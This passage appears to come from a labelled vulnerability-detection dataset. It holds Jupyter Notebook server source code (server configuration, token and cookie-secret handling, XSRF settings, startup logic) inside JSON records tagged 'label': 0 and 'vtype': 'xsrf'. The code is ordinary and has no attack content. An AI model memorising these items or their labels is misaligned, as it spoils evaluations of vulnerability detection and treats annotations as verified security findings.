Unicode('localhost', config=True,\n        help=\"The IP address the notebook server will listen on.\"\n    )\n\n    @default('ip')\n    def _default_ip(self):\n        \"\"\"Return localhost if available, 127.0.0.1 otherwise.\n        \n        On some (horribly broken) systems, localhost cannot be bound.\n        \"\"\"\n        s = socket.socket()\n        try:\n            s.bind(('localhost', 0))\n        except socket.error as e:\n            self.log.warning(\"Cannot bind to localhost, using 127.0.0.1 as default ip\\n%s\", e)\n            return '127.0.0.1'\n        else:\n            s.close()\n            return 'localhost'\n\n    @validate('ip')\n    def _valdate_ip(self, proposal):\n        value = proposal['value']\n        if value == u'*':\n            value = u''\n        return value\n\n    port = Integer(8888, config=True,\n        help=\"The port the notebook server will listen on.\"\n    )\n\n    port_retries = Integer(50, config=True,\n        help=\"The number of additional ports to try if the specified port is not available.\"\n    )\n\n    certfile = Unicode(u'', config=True, \n        help=\"\"\"The full path to an SSL/TLS certificate file.\"\"\"\n    )\n    \n    keyfile = Unicode(u'', config=True, \n        help=\"\"\"The full path to a private key file for usage with SSL/TLS.\"\"\"\n    )\n    \n    client_ca = Unicode(u'', config=True,\n        help=\"\"\"The full path to a certificate authority certificate for SSL/TLS client authentication.\"\"\"\n    )\n    \n    cookie_secret_file = Unicode(config=True,\n        help=\"\"\"The file where the cookie secret is stored.\"\"\"\n    )\n\n    @default('cookie_secret_file')\n    def _default_cookie_secret_file(self):\n        return os.path.join(self.runtime_dir, 'notebook_cookie_secret')\n    \n    cookie_secret = Bytes(b'', config=True,\n        help=\"\"\"The random bytes used to secure cookies.\n        By default this is a new random number every time you start the Notebook.\n        Set it to a value in a config file to enable logins to persist across server sessions.\n        \n        Note: Cookie secrets should be kept private, do not share config files with\n        cookie_secret stored in plaintext (you can read the value from a file).\n        \"\"\"\n    )\n    \n    @default('cookie_secret')\n    def _default_cookie_secret(self):\n        if os.path.exists(self.cookie_secret_file):\n            with io.open(self.cookie_secret_file, 'rb') as f:\n                return f.read()\n        else:\n            secret = encodebytes(os.urandom(1024))\n            self._write_cookie_secret_file(secret)\n            return secret\n    \n    def _write_cookie_secret_file(self, secret):\n        \"\"\"write my secret to my secret_file\"\"\"\n        self.log.info(\"Writing notebook server cookie secret to %s\", self.cookie_secret_file)\n        with io.open(self.cookie_secret_file, 'wb') as f:\n            f.write(secret)\n        try:\n            os.chmod(self.cookie_secret_file, 0o600)\n        except OSError:\n            self.log.warning(\n                \"Could not set permissions on %s\",\n                self.cookie_secret_file\n            )\n\n    token = Unicode('<generated>',\n        help=\"\"\"Token used for authenticating first-time connections to the server.\n\n        When no password is enabled,\n        the default is to generate a new, random token.\n\n        Setting to an empty string disables authentication altogether, which is NOT RECOMMENDED.\n        \"\"\"\n    ).tag(config=True)\n\n    one_time_token = Unicode(\n        help=\"\"\"One-time token used for opening a browser.\n\n        Once used, this token cannot be used again.\n        \"\"\"\n    )\n\n    _token_generated = True\n\n    @default('token')\n    def _token_default(self):\n        if self.password:\n            # no token if password is enabled\n            self._token_generated = False\n            return u''\n        else:\n            self._token_generated = True\n            return binascii.hexlify(os.urandom(24)).decode('ascii')\n\n    @observe('token')\n    def _token_changed(self, change):\n        self._token_generated = False\n\n    password = Unicode(u'', config=True,\n                      help=\"\"\"Hashed password to use for web authentication.\n\n                      To generate, type in a python/IPython shell:\n\n                        from notebook.auth import passwd; passwd()\n\n                      The string should be of the form type:salt:hashed-password.\n                      \"\"\"\n    )\n\n    password_required = Bool(False, config=True,\n                      help=\"\"\"Forces users to use a password for the Notebook server.\n                      This is useful in a multi user environment, for instance when\n                      everybody in the LAN can access each other's machine though ssh.\n\n                      In such a case, server the notebook server on localhost is not secure\n                      since any user can connect to the notebook server via ssh.\n\n                      \"\"\"\n\n    disable_check_xsrf = Bool(False, config=True,\n        help=\"\"\"Disable cross-site-request-forgery protection\n\n        Jupyter notebook 4.3.1 introduces protection from cross-site request forgeries,\n        requiring API requests to either:\n\n        - originate from the (validated with XSRF cookie and token), or\n        - authenticate with a token\n\n        Some anonymous compute resources still desire the ability to run code,\n        completely without authentication.\n        These services can disable all authentication and security checks,\n        with the full knowledge of what that implies.\n        \"\"\"\n    )\n\n    open_browser = Bool(True, config=True,\n                        help=\"\"\"Whether to open in a browser after starting.\n                        The specific browser used is platform dependent and\n                        determined by the python standard library `webbrowser`\n                        module, unless it is overridden using the --browser\n                        (NotebookApp.browser) configuration option.\n                        \"\"\")\n\n    browser = Unicode(u'', config=True,\n                      help=\"\"\"Specify what command to use to invoke a web\n                      browser when opening the notebook. If not specified, the\n                      default browser will be determined by the `webbrowser`\n                      standard library module, which allows setting of the\n                      BROWSER environment variable to override it.\n                      \"\"\")\n    \n    webapp_settings = Dict(config=True,\n        help=\"DEPRECATED, use tornado_settings\"\n    )\n\n    @observe('webapp_settings') \n    def _update_webapp_settings(self, change):\n        self.log.warning(\"\\n    webapp_settings is deprecated, use tornado_settings.\\n\")\n        self.tornado_settings = change['new']\n    \n    tornado_settings = Dict(config=True,\n            help=\"Supply overrides for the tornado.web.Application that the \"\n                 \"Jupyter notebook uses.\")\n    \n    terminado_settings = Dict(config=True,\n            help='Supply overrides for terminado. Currently only supports \"shell_command\".')\n\n    cookie_options = Dict(config=True,\n        help=\"Extra keyword arguments to pass to `set_secure_cookie`.\"\n             \" See tornado's set_secure_cookie docs for details.\"\n    )\n    ssl_options = Dict(config=True,\n            help=\"\"\"Supply SSL options for the tornado HTTPServer.\n            See the tornado docs for details.\"\"\")\n    \n    jinja_environment_options = Dict(config=True, \n            help=\"Supply extra arguments that will be passed to Jinja environment.\")\n\n    jinja_template_vars = Dict(\n        config=True,\n        help=\"Extra variables to supply to jinja templates when rendering.\",\n    )\n    \n    enable_mathjax = Bool(True, config=True,\n        help=\"\"\"Whether to enable MathJax for typesetting math/TeX\n\n        MathJax is the javascript library Jupyter uses to render math/LaTeX. It is\n        very large, so you may want to disable it if you have a slow internet\n        connection, or for offline use of the notebook.\n\n        When disabled, equations etc. will appear as their untransformed TeX source.\n        \"\"\"\n    )\n\n    @observe('enable_mathjax')\n    def _update_enable_mathjax(self, change):\n        \"\"\"set mathjax url to empty if mathjax is disabled\"\"\"\n        if not change['new']:\n            self.mathjax_url = u''\n\n    base_url = Unicode('/', config=True,\n                               help='''The base URL for the notebook server.\n\n                               Leading and trailing slashes can be omitted,\n                               and will automatically be added.\n                               ''')\n\n    @validate('base_url')\n    def _update_base_url(self, proposal):\n        value = proposal['value']\n        if not value.startswith('/'):\n            value = '/' + value\n        elif not value.endswith('/'):\n            value = value + '/'\n        return value\n    \n    base_project_url = Unicode('/', config=True, help=\"\"\"DEPRECATED use base_url\"\"\")\n\n    @observe('base_project_url')\n    def _update_base_project_url(self, change):\n        self.log.warning(\"base_project_url is deprecated, use base_url\")\n        self.base_url = change['new']\n\n    extra_static_paths = List(Unicode(), config=True,\n        help=\"\"\"Extra paths to search for serving static files.\n        \n        This allows adding javascript/css to be available from the notebook server machine,\n        or overriding individual files in the IPython\"\"\"\n    )\n    \n    @property\n    def static_file_path(self):\n        \"\"\"return extra paths + the default location\"\"\"\n        return self.extra_static_paths + [DEFAULT_STATIC_FILES_PATH]\n    \n    static_custom_path = List(Unicode(),\n        help=\"\"\"Path to search for custom.js, css\"\"\"\n    )\n\n    @default('static_custom_path')\n    def _default_static_custom_path(self):\n        return [\n            os.path.join(d, 'custom') for d in (\n                self.config_dir,\n                DEFAULT_STATIC_FILES_PATH)\n        ]\n\n    extra_template_paths = List(Unicode(), config=True,\n        help=\"\"\"Extra paths to search for serving jinja templates.\n\n        Can be used to override templates from notebook.templates.\"\"\"\n    )\n\n    @property\n    def template_file_path(self):\n        \"\"\"return extra paths + the default locations\"\"\"\n        return self.extra_template_paths + DEFAULT_TEMPLATE_PATH_LIST\n\n    extra_nbextensions_path = List(Unicode(), config=True,\n        help=\"\"\"extra paths to look for Javascript notebook extensions\"\"\"\n    )\n    \n    @property\n    def nbextensions_path(self):\n        \"\"\"The path to look for Javascript notebook extensions\"\"\"\n        path = self.extra_nbextensions_path + jupyter_path('nbextensions')\n        # FIXME: remove IPython nbextensions path after a migration period\n        try:\n            from IPython.paths import get_ipython_dir\n        except ImportError:\n            pass\n        else:\n            path.append(os.path.join(get_ipython_dir(), 'nbextensions'))\n        return path\n\n    websocket_url = Unicode(\"\", config=True,\n        help=\"\"\"The base URL for websockets,\n        if it differs from the HTTP server (hint: it almost certainly doesn't).\n        \n        Should be in the form of an HTTP origin: ws[s]://hostname[:port]\n        \"\"\"\n    )\n\n    mathjax_url = Unicode(\"\", config=True,\n        help=\"\"\"A custom url for MathJax.js.\n        Should be in the form of a case-sensitive url to MathJax,\n        for example:  /static/components/MathJax/MathJax.js\n        \"\"\"\n    )\n\n    @default('mathjax_url')\n    def _default_mathjax_url(self):\n        if not self.enable_mathjax:\n            return u''\n        static_url_prefix = self.tornado_settings.get(\"static_url_prefix\", \"static\")\n        return url_path_join(static_url_prefix, 'components', 'MathJax', 'MathJax.js')\n    \n    @observe('mathjax_url')\n    def _update_mathjax_url(self, change):\n        new = change['new']\n        if new and not self.enable_mathjax:\n            # enable_mathjax=False overrides mathjax_url\n            self.mathjax_url = u''\n        else:\n            self.log.info(\"Using MathJax: %s\", new)\n\n    mathjax_config = Unicode(\"TeX-AMS-MML_HTMLorMML-full,Safe\", config=True,\n        help=\"\"\"The MathJax.js configuration file that is to be used.\"\"\"\n    )\n\n    @observe('mathjax_config')\n    def _update_mathjax_config(self, change):\n        self.log.info(\"Using MathJax configuration file: %s\", change['new'])\n\n    contents_manager_class = Type(\n        default_value=FileContentsManager,\n        klass=ContentsManager,\n        config=True,\n        help='The notebook manager class to use.'\n    )\n\n    kernel_manager_class = Type(\n        default_value=MappingKernelManager,\n        config=True,\n        help='The kernel manager class to use.'\n    )\n\n    session_manager_class = Type(\n        default_value=SessionManager,\n        config=True,\n        help='The session manager class to use.'\n    )\n\n    config_manager_class = Type(\n        default_value=ConfigManager,\n        config = True,\n        help='The config manager class to use'\n    )\n\n    kernel_spec_manager = Instance(KernelSpecManager, allow_none=True)\n\n    kernel_spec_manager_class = Type(\n        default_value=KernelSpecManager,\n        config=True,\n        help=\"\"\"\n        The kernel spec manager class to use. Should be a subclass\n        of `jupyter_client.kernelspec.KernelSpecManager`.\n\n        The Api of KernelSpecManager is provisional and might change\n        without warning between this version of Jupyter and the next stable one.\n        \"\"\"\n    )\n\n    login_handler_class = Type(\n        default_value=LoginHandler,\n        klass=web.RequestHandler,\n        config=True,\n        help='The login handler class to use.',\n    )\n\n    logout_handler_class = Type(\n        default_value=LogoutHandler,\n        klass=web.RequestHandler,\n        config=True,\n        help='The logout handler class to use.',\n    )\n\n    trust_xheaders = Bool(False, config=True,\n        help=(\"Whether to trust or not X-Scheme/X-Forwarded-Proto and X-Real-Ip/X-Forwarded-For headers\"\n              \"sent by the upstream reverse proxy. Necessary if the proxy handles SSL\")\n    )\n\n    info_file = Unicode()\n\n    @default('info_file')\n    def _default_info_file(self):\n        info_file = \"nbserver-%s.json\" % os.getpid()\n        return os.path.join(self.runtime_dir, info_file)\n    \n    pylab = Unicode('disabled', config=True,\n        help=\"\"\"\n        DISABLED: use %pylab or %matplotlib in the notebook to enable matplotlib.\n        \"\"\"\n    )\n\n    @observe('pylab')\n    def _update_pylab(self, change):\n        \"\"\"when --pylab is specified, display a warning and exit\"\"\"\n        if change['new'] != 'warn':\n            backend = ' %s' % change['new']\n        else:\n            backend = ''\n        self.log.error(\"Support for specifying --pylab on the command line has been removed.\")\n        self.log.error(\n            \"Please use `%pylab{0}` or `%matplotlib{0}` in the notebook itself.\".format(backend)\n        )\n        self.exit(1)\n\n    notebook_dir = Unicode(config=True,\n        help=\"The directory to use for notebooks and kernels.\"\n    )\n\n    @default('notebook_dir')\n    def _default_notebook_dir(self):\n        if self.file_to_run:\n            return os.path.dirname(os.path.abspath(self.file_to_run))\n        else:\n            return py3compat.getcwd()\n\n    @validate('notebook_dir')\n    def _notebook_dir_validate(self, proposal):\n        value = proposal['value']\n        # Strip any trailing slashes\n        # *except* if it's root\n        _, path = os.path.splitdrive(value)\n        if path == os.sep:\n            return value\n        value = value.rstrip(os.sep)\n        if not os.path.isabs(value):\n            # If we receive a non-absolute path, make it absolute.\n            value = os.path.abspath(value)\n        if not os.path.isdir(value):\n            raise TraitError(\"No such notebook dir: %r\" % value)\n        return value\n\n    @observe('notebook_dir')\n    def _update_notebook_dir(self, change):\n        \"\"\"Do a bit of validation of the notebook dir.\"\"\"\n        # setting App.notebook_dir implies setting notebook and kernel dirs as well\n        new = change['new']\n        self.config.FileContentsManager.root_dir = new\n        self.config.MappingKernelManager.root_dir = new\n\n    # TODO: Remove me in notebook 5.0\n    server_extensions = List(Unicode(), config=True,\n        help=(\"DEPRECATED use the nbserver_extensions dict instead\")\n    )\n    \n    @observe('server_extensions')\n    def _update_server_extensions(self, change):\n        self.log.warning(\"server_extensions is deprecated, use nbserver_extensions\")\n        self.server_extensions = change['new']\n        \n    nbserver_extensions = Dict({}, config=True,\n        help=(\"Dict of Python modules to load as notebook server extensions.\"\n              \"Entry values can be used to enable and disable the loading of\"\n              \"the extensions. The extensions will be loaded in alphabetical \"\n              \"order.\")\n    )\n\n    reraise_server_extension_failures = Bool(\n        False,\n        config=True,\n        help=\"Reraise exceptions encountered loading server extensions?\",\n    )\n\n    iopub_msg_rate_limit = Float(1000, config=True, help=\"\"\"(msgs/sec)\n        Maximum rate at which messages can be sent on iopub before they are\n        limited.\"\"\")\n\n    iopub_data_rate_limit = Float(1000000, config=True, help=\"\"\"(bytes/sec)\n        Maximum rate at which messages can be sent on iopub before they are\n        limited.\"\"\")\n\n    rate_limit_window = Float(3, config=True, help=\"\"\"(sec) Time window used to \n        check the message and data rate limits.\"\"\")\n\n    def parse_command_line(self, argv=None):\n        super(NotebookApp, self).parse_command_line(argv)\n\n        if self.extra_args:\n            arg0 = self.extra_args[0]\n            f = os.path.abspath(arg0)\n            self.argv.remove(arg0)\n            if not os.path.exists(f):\n                self.log.critical(\"No such file or directory: %s\", f)\n                self.exit(1)\n            \n            # Use config here, to ensure that it takes higher priority than\n            # anything that comes from the config dirs.\n            c = Config()\n            if os.path.isdir(f):\n                c.NotebookApp.notebook_dir = f\n            elif os.path.isfile(f):\n                c.NotebookApp.file_to_run = f\n            self.update_config(c)\n\n    def init_configurables(self):\n        self.kernel_spec_manager = self.kernel_spec_manager_class(\n            parent=self,\n        )\n        self.kernel_manager = self.kernel_manager_class(\n            parent=self,\n            log=self.log,\n            connection_dir=self.runtime_dir,\n            kernel_spec_manager=self.kernel_spec_manager,\n        )\n        self.contents_manager = self.contents_manager_class(\n            parent=self,\n            log=self.log,\n        )\n        self.session_manager = self.session_manager_class(\n            parent=self,\n            log=self.log,\n            kernel_manager=self.kernel_manager,\n            contents_manager=self.contents_manager,\n        )\n        self.config_manager = self.config_manager_class(\n            parent=self,\n            log=self.log,\n            config_dir=os.path.join(self.config_dir, 'nbconfig'),\n        )\n\n    def init_logging(self):\n        # This prevents double log messages because tornado use a root logger that\n        # self.log is a child of. The logging module dipatches log messages to a log\n        # and all of its ancenstors until propagate is set to False.\n        self.log.propagate = False\n        \n        for log in app_log, access_log, gen_log:\n            # consistent log output name (NotebookApp instead of tornado.access, etc.)\n            log.name = self.log.name\n        # hook up tornado 3's loggers to our app handlers\n        logger = logging.getLogger('tornado')\n        logger.propagate = True\n        logger.parent = self.log\n        logger.setLevel(self.log.level)\n    \n    def init_webapp(self):\n        \"\"\"initialize tornado webapp and httpserver\"\"\"\n        self.tornado_settings['allow_origin'] = self.allow_origin\n        if self.allow_origin_pat:\n            self.tornado_settings['allow_origin_pat'] = re.compile(self.allow_origin_pat)\n        self.tornado_settings['allow_credentials'] = self.allow_credentials\n        self.tornado_settings['cookie_options'] = self.cookie_options\n        self.tornado_settings['token'] = self.token\n        if (self.open_browser or self.file_to_run) and not self.password:\n            self.one_time_token = binascii.hexlify(os.urandom(24)).decode('ascii')\n            self.tornado_settings['one_time_token'] = self.one_time_token\n\n        # ensure default_url starts with base_url\n        if not self.default_url.startswith(self.base_url):\n            self.default_url = url_path_join(self.base_url, self.default_url)\n\n        if self.password_required and (not self.password):\n            self.log.critical(\"Notebook servers are configured to only be run with a password.\")\n            self.log.critical(\"Hint: run the following command to set a password\")\n            self.log.critical(\"\\t$ python -m notebook.auth password\")\n            sys.exit(1)\n\n        self.web_app = NotebookWebApplication(\n            self, self.kernel_manager, self.contents_manager,\n            self.session_manager, self.kernel_spec_manager,\n            self.config_manager,\n            self.log, self.base_url, self.default_url, self.tornado_settings,\n            self.jinja_environment_options\n        )\n        ssl_options = self.ssl_options\n        if self.certfile:\n            ssl_options['certfile'] = self.certfile\n        if self.keyfile:\n            ssl_options['keyfile'] = self.keyfile\n        if self.client_ca:\n            ssl_options['ca_certs'] = self.client_ca\n        if not ssl_options:\n            # None indicates no SSL config\n            ssl_options = None\n        else:\n            # SSL may be missing, so only import it if it's to be used\n            import ssl\n            # Disable SSLv3 by default, since its use is discouraged.\n            ssl_options.setdefault('ssl_version', ssl.PROTOCOL_TLSv1)\n            if ssl_options.get('ca_certs', False):\n                ssl_options.setdefault('cert_reqs', ssl.CERT_REQUIRED)\n        \n        self.login_handler_class.validate_security(self, ssl_options=ssl_options)\n        self.http_server = httpserver.HTTPServer(self.web_app, ssl_options=ssl_options,\n                                                 xheaders=self.trust_xheaders)\n\n        success = None\n        for port in random_ports(self.port, self.port_retries+1):\n            try:\n                self.http_server.listen(port, self.ip)\n            except socket.error as e:\n                if e.errno == errno.EADDRINUSE:\n                    self.log.info('The port %i is already in use, trying another port.' % port)\n                    continue\n                elif e.errno in (errno.EACCES, getattr(errno, 'WSAEACCES', errno.EACCES)):\n                    self.log.warning(\"Permission to listen on port %i denied\" % port)\n                    continue\n                else:\n                    raise\n            else:\n                self.port = port\n                success = True\n                break\n        if not success:\n            self.log.critical('ERROR: the notebook server could not be started because '\n                              'no available port could be found.')\n            self.exit(1)\n    \n    @property\n    def display_url(self):\n        ip = self.ip if self.ip else '[all ip addresses on your system]'\n        url = self._url(ip)\n        if self.token:\n            # Don't log full token if it came from config\n            token = self.token if self._token_generated else '...'\n            url = url_concat(url, {'token': token})\n        return url\n\n    @property\n    def connection_url(self):\n        ip = self.ip if self.ip else 'localhost'\n        return self._url(ip)\n\n    def _url(self, ip):\n        proto = 'https' if self.certfile else 'http'\n        return \"%s://%s:%i%s\" % (proto, ip, self.port, self.base_url)\n\n    def init_terminals(self):\n        try:\n            from .terminal import initialize\n            initialize(self.web_app, self.notebook_dir, self.connection_url, self.terminado_settings)\n            self.web_app.settings['terminals_available'] = True\n        except ImportError as e:\n            log = self.log.debug if sys.platform == 'win32' else self.log.warning\n            log(\"Terminals not available (error was %s)\", e)\n\n    def init_signal(self):\n        if not sys.platform.startswith('win') and sys.stdin.isatty():\n            signal.signal(signal.SIGINT, self._handle_sigint)\n        signal.signal(signal.SIGTERM, self._signal_stop)\n        if hasattr(signal, 'SIGUSR1'):\n            # Windows doesn't support SIGUSR1\n            signal.signal(signal.SIGUSR1, self._signal_info)\n        if hasattr(signal, 'SIGINFO'):\n            # only on BSD-based systems\n            signal.signal(signal.SIGINFO, self._signal_info)\n    \n    def _handle_sigint(self, sig, frame):\n        \"\"\"SIGINT handler spawns confirmation dialog\"\"\"\n        # register more forceful signal handler for ^C^C case\n        signal.signal(signal.SIGINT, self._signal_stop)\n        # request confirmation dialog in bg thread, to avoid\n        # blocking the App\n        thread = threading.Thread(target=self._confirm_exit)\n        thread.daemon = True\n        thread.start()\n    \n    def _restore_sigint_handler(self):\n        \"\"\"callback for restoring original SIGINT handler\"\"\"\n        signal.signal(signal.SIGINT, self._handle_sigint)\n    \n    def _confirm_exit(self):\n        \"\"\"confirm shutdown on ^C\n        \n        A second ^C, or answering 'y' within 5s will cause shutdown,\n        otherwise original SIGINT handler will be restored.\n        \n        This doesn't work on Windows.\n        \"\"\"\n        info = self.log.info\n        info('interrupted')\n        print(self.notebook_info())\n        sys.stdout.write(\"Shutdown this notebook server (y/[n])? \")\n        sys.stdout.flush()\n        r,w,x = select.select([sys.stdin], [], [], 5)\n        if r:\n            line = sys.stdin.readline()\n            if line.lower().startswith('y') and 'n' not in line.lower():\n                self.log.critical(\"Shutdown confirmed\")\n                ioloop.IOLoop.current().stop()\n                return\n        else:\n            print(\"No answer for 5s:\", end=' ')\n        print(\"resuming operation...\")\n        # no answer, or answer is no:\n        # set it back to original SIGINT handler\n        # use IOLoop.add_callback because signal.signal must be called\n        # from main thread\n        ioloop.IOLoop.current().add_callback(self._restore_sigint_handler)\n    \n    def _signal_stop(self, sig, frame):\n        self.log.critical(\"received signal %s, stopping\", sig)\n        ioloop.IOLoop.current().stop()\n\n    def _signal_info(self, sig, frame):\n        print(self.notebook_info())\n    \n    def init_components(self):\n        \"\"\"Check the components submodule, and warn if it's unclean\"\"\"\n        # TODO: this should still check, but now we use bower, not git submodule\n        pass\n\n    def init_server_extensions(self):\n        \"\"\"Load any extensions specified by config.\n\n        Import the module, then call the load_jupyter_server_extension function,\n        if one exists.\n        \n        The extension API is experimental, and may change in future releases.\n        \"\"\"\n        \n        # TODO: Remove me in notebook 5.0\n        for modulename in self.server_extensions:\n            # Don't override disable state of the extension if it already exist\n            # in the new traitlet\n            if not modulename in self.nbserver_extensions:\n                self.nbserver_extensions[modulename] = True\n        \n        for modulename in sorted(self.nbserver_extensions):\n            if self.nbserver_extensions[modulename]:\n                try:\n                    mod = importlib.import_module(modulename)\n                    func = getattr(mod, 'load_jupyter_server_extension', None)\n                    if func is not None:\n                        func(self)\n                except Exception:\n                    if self.reraise_server_extension_failures:\n                        raise\n                    self.log.warning(\"Error loading server extension %s\", modulename,\n                                  exc_info=True)\n\n    def init_mime_overrides(self):\n        # On some Windows machines, an application has registered an incorrect\n        # mimetype for CSS in the registry. Tornado uses this when serving\n        # .css files, causing browsers to reject the stylesheet. We know the\n        # mimetype always needs to be text/css, so we override it here.\n        mimetypes.add_type('text/css', '.css')\n\n    @catch_config_error\n    def initialize(self, argv=None):\n        super(NotebookApp, self).initialize(argv)\n        self.init_logging()\n        if self._dispatching:\n            return\n        self.init_configurables()\n        self.init_components()\n        self.init_webapp()\n        self.init_terminals()\n        self.init_signal()\n        self.init_server_extensions()\n        self.init_mime_overrides()\n\n    def cleanup_kernels(self):\n        \"\"\"Shutdown all kernels.\n        \n        The kernels will shutdown themselves when this process no longer exists,\n        but explicit shutdown allows the KernelManagers to cleanup the connection files.\n        \"\"\"\n        self.log.info('Shutting down kernels')\n        self.kernel_manager.shutdown_all()\n\n    def notebook_info(self):\n        \"Return the current working directory and the server url information\"\n        info = self.contents_manager.info_string() + \"\\n\"\n        info += \"%d active kernels \\n\" % len(self.kernel_manager._kernels)\n        return info + \"The Jupyter Notebook is running at: %s\" % self.display_url\n\n    def server_info(self):\n        \"\"\"Return a JSONable dict of information about this server.\"\"\"\n        return {'url': self.connection_url,\n                'hostname': self.ip if self.ip else 'localhost',\n                'port': self.port,\n                'secure': bool(self.certfile),\n                'base_url': self.base_url,\n                'token': self.token,\n                'notebook_dir': os.path.abspath(self.notebook_dir),\n                'password': bool(self.password),\n                'pid': os.getpid(),\n               }\n\n    def write_server_info_file(self):\n        \"\"\"Write the result of server_info() to the JSON file info_file.\"\"\"\n        with open(self.info_file, 'w') as f:\n            json.dump(self.server_info(), f, indent=2, sort_keys=True)\n\n    def remove_server_info_file(self):\n        \"\"\"Remove the nbserver-<pid>.json file created for this server.\n        \n        Ignores the error raised when the file has already been removed.\n        \"\"\"\n        try:\n            os.unlink(self.info_file)\n        except OSError as e:\n            if e.errno != errno.ENOENT:\n                raise\n\n    def start(self):\n        \"\"\" Start the Notebook server app, after initialization\n        \n        This method takes no arguments so all configuration and initialization\n        must be done prior to calling this method.\"\"\"\n\n        if not self.allow_root:\n            # check if we are running as root, and abort if it's not allowed\n            try:\n                uid = os.geteuid()\n            except AttributeError:\n                uid = -1 # anything nonzero here, since we can't check UID assume non-root\n            if uid == 0:\n                self.log.critical(\"Running as root is not recommended. Use --allow-root to bypass.\")\n                self.exit(1)\n\n        super(NotebookApp, self).start()\n\n        info = self.log.info\n        for line in self.notebook_info().split(\"\\n\"):\n            info(line)\n        info(\"Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).\")\n\n        self.write_server_info_file()\n\n        if self.open_browser or self.file_to_run:\n            try:\n                browser = webbrowser.get(self.browser or None)\n            except webbrowser.Error as e:\n                self.log.warning('No web browser found: %s.' % e)\n                browser = None\n            \n            if self.file_to_run:\n                if not os.path.exists(self.file_to_run):\n                    self.log.critical(\"%s does not exist\" % self.file_to_run)\n                    self.exit(1)\n\n                relpath = os.path.relpath(self.file_to_run, self.notebook_dir)\n                uri = url_escape(url_path_join('notebooks', *relpath.split(os.sep)))\n            else:\n                # default_url contains base_url, but so does connection_url\n                uri = self.default_url[len(self.base_url):]\n            if self.one_time_token:\n                uri = url_concat(uri, {'token': self.one_time_token})\n            if browser:\n                b = lambda : browser.open(url_path_join(self.connection_url, uri),\n                                          new=2)\n                threading.Thread(target=b).start()\n\n        if self.token and self._token_generated:\n            # log full URL with generated token, so there's a copy/pasteable link\n            # with auth info.\n            self.log.critical('\\n'.join([\n                '\\n',\n                'Copy/paste this URL into your browser when you connect for the first time,',\n                'to login with a token:',\n                '    %s' % url_concat(self.connection_url, {'token': self.token}),\n            ]))\n\n        self.io_loop = ioloop.IOLoop.current()\n        if sys.platform.startswith('win'):\n            # add no-op to wake every 5s\n            # to handle signals that may be ignored by the inner loop\n            pc = ioloop.PeriodicCallback(lambda : None, 5000)\n            pc.start()\n        try:\n            self.io_loop.start()\n        except KeyboardInterrupt:\n            info(\"Interrupted...\")\n        finally:\n            self.remove_server_info_file()\n            self.cleanup_kernels()\n\n    def stop(self):\n        def _stop():\n            self.http_server.stop()\n            self.io_loop.stop()\n        self.io_loop.add_callback(_stop)\n\n\ndef list_running_servers(runtime_dir=None):\n    \"\"\"Iterate over the server info files of running notebook servers.\n    \n    Given a runtime directory, find nbserver-* files in the security directory,\n    and yield dicts of their information, each one pertaining to\n    a currently running notebook server instance.\n    \"\"\"\n    if runtime_dir is None:\n        runtime_dir = jupyter_runtime_dir()\n\n    # The runtime dir might not exist\n    if not os.path.isdir(runtime_dir):\n        return\n\n    for file in os.listdir(runtime_dir):\n        if file.startswith('nbserver-'):\n            with io.open(os.path.join(runtime_dir, file), encoding='utf-8') as f:\n                info = json.load(f)\n\n            # Simple check whether that process is really still running\n            # Also remove leftover files from IPython 2.x without a pid field\n            if ('pid' in info) and check_pid(info['pid']):\n                yield info\n            else:\n                # If the process has died, try to delete its info file\n                try:\n                    os.unlink(os.path.join(runtime_dir, file))\n                except OSError:\n                    pass  # TODO: This should warn or log or something\n#-----------------------------------------------------------------------------\n# Main entry point\n#-----------------------------------------------------------------------------\n\nmain = launch_new_instance = NotebookApp.launch_instance\n/n/n/n", "label": 0, "vtype": "xsrf"}, {"id": "d6f091c4439c174c7700776c0cee03053403f600", "code": "/notebook/base/handlers.py/n/n\"\"\"Base Tornado handlers for the notebook server.\"\"\"\n\n# Copyright (c) Jupyter Development Team.\n# Distributed under the terms of the Modified BSD License.\n\nimport functools\nimport json\nimport os\nimport re\nimport sys\nimport traceback\ntry:\n    # py3\n    from http.client import responses\nexcept ImportError:\n    from httplib import responses\ntry:\n    from urllib.parse import urlparse # Py 3\nexcept ImportError:\n    from urlparse import urlparse # Py 2\n\nfrom jinja2 import TemplateNotFound\nfrom tornado import web, gen, escape\nfrom tornado.log import app_log\n\nfrom notebook._sysinfo import get_sys_info\n\nfrom traitlets.config import Application\nfrom ipython_genutils.path import filefind\nfrom ipython_genutils.py3compat import string_types\n\nimport notebook\nfrom notebook.utils import is_hidden, url_path_join, url_is_absolute, url_escape\nfrom notebook.services.security import csp_report_uri\n\n#-----------------------------------------------------------------------------\n# Top-level handlers\n#-----------------------------------------------------------------------------\nnon_alphanum = re.compile(r'[^A-Za-z0-9]')\n\nsys_info = json.dumps(get_sys_info())\n\ndef log():\n    if Application.initialized():\n        return Application.instance().log\n    else:\n        return app_log\n\nclass AuthenticatedHandler(web.RequestHandler):\n    \"\"\"A RequestHandler with an authenticated user.\"\"\"\n\n    @property\n    def content_security_policy(self):\n        \"\"\"The default Content-Security-Policy header\n        \n        Can be overridden by defining Content-Security-Policy in settings['headers']\n        \"\"\"\n        return '; '.join([\n            \"frame-ancestors 'self'\",\n            # Make sure the report-uri is relative to the base_url\n            \"report-uri \" + url_path_join(self.base_url, csp_report_uri),\n        ])\n\n    def set_default_headers(self):\n        headers = self.settings.get('headers', {})\n\n        if \"Content-Security-Policy\" not in headers:\n            headers[\"Content-Security-Policy\"] = self.content_security_policy\n\n        # Allow for overriding headers\n        for header_name,value in headers.items() :\n            try:\n                self.set_header(header_name, value)\n            except Exception as e:\n                # tornado raise Exception (not a subclass)\n                # if method is unsupported (websocket and Access-Control-Allow-Origin\n                # for example, so just ignore)\n                self.log.debug(e)\n    \n    def clear_login_cookie(self):\n        self.clear_cookie(self.cookie_name)\n    \n    def get_current_user(self):\n        if self.login_handler is None:\n            return 'anonymous'\n        return self.login_handler.get_user(self)\n\n    def skip_check_origin(self):\n        \"\"\"Ask my login_handler if I should skip the origin_check\n        \n        For example: in the default LoginHandler, if a request is token-authenticated,\n        origin checking should be skipped.\n        \"\"\"\n        if self.login_handler is None or not hasattr(self.login_handler, 'should_check_origin'):\n            return False\n        return not self.login_handler.should_check_origin(self)\n\n    @property\n    def token_authenticated(self):\n        \"\"\"Have I been authenticated with a token?\"\"\"\n        if self.login_handler is None or not hasattr(self.login_handler, 'is_token_authenticated'):\n            return False\n        return self.login_handler.is_token_authenticated(self)\n\n    